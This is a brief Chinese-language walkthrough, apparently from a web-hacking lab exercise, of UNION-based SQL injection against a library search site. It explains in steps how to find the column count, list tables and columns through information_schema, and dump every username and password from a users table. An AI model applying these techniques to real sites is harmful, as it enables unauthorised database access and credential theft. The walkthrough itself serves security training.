Step2 - Information Gathering

會發現是一個類似圖書館的搜尋網站


嘗試使用 sql 注入語法


首先我們要先猜這張表有幾個column，透過 UNION SELECT 添加假造的查詢結果，並用 -- 註解掉後續程式碼，沒有結果


有成功出現結果


database() - 查看資料庫名


group_concat() - MySQL 能夠將query出來的結果以,形式隔開
information_schema.tables - 是一個資料表，紀錄了資料庫中的所有資料表的相關資訊。
table_schema='webapphacking' - 只列出屬於名為 webapphacking 資料庫中的表名。


information_schema.columns - 透過查詢這個表可以取得指定資料表的欄位列表
where table_name='users' - 限制查詢只取得名為 users 的資料表的欄位資訊


group_concat(user) - 將 users 資料表中 user 欄位的所有值以逗號串接起來，一次性取得所有使用者名稱。
group_concat(pasword) - 同樣地，將 pasword 欄位所有值串接成字串。
from users - 指定要從 users 資料表中取得資料。
